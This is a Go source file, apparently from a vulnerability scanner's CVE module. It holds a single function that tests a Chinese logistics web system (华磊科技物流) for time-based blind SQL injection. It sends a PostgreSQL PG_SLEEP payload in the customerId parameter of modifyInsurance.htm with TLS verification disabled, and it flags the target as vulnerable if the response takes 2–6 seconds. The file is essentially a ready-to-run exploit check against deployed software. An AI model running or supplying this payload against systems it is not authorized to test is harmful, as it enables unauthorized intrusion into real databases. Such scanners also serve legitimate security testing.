package CVEs

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
)

func HuaLeiKeJiWuLiu_SQLInjection(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(3))", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	// 记录请求开始时间
	startTime := time.Now()

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	// 记录请求结束时间
	endTime := time.Now()

	// 计算请求时长
	duration := endTime.Sub(startTime)

	if 2*time.Second <= duration && duration <= 6*time.Second {
		fmt.Println("[*]华磊科技物流 modifyInsurance sql注入漏洞 : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(3))\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
